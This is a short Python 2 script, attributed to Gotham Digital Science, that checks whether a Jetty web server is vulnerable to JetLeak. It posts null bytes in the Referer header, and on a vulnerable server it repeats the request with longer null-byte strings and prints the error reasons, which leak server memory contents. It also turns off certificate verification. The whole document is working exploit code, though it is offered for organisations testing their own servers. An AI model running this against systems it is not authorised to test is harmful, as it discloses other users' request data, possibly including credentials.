import httplib, urllib, ssl, string, sys, getopt,requests
from urlparse import urlparse

'''
Author: Gotham Digital Science
Purpose: This tool is intended to provide a quick-and-dirty way for organizations to test whether 
		 their Jetty web server versions are vulnerable to JetLeak. Currently, this script does 
		 not handle sites with invalid SSL certs. This will be fixed in a future iteration.
'''

_url = sys.argv[1]
if _url=='':
	print("Error: Invalid URL Entered.")
	sys.exit(1)

print _url

x = "\x00"
_headers = {"Referer": x}
r1=requests.post(url=_url,headers=_headers,verify=False)
def getinfo():
	for _num in range(100,155):
		_headers = {"Referer": x*_num}
		r1=requests.post(url=_url,headers=_headers,verify=False)
		print r1.reason

if (r1.status_code == 400 and ("Illegal character 0x0 in state" in r1.reason)):
    print("\r\nThis version of Jetty is VULNERABLE to JetLeak!")
    getinfo()
else:
    print("\r\nThis version of Jetty is NOT vulnerable to JetLeak.")

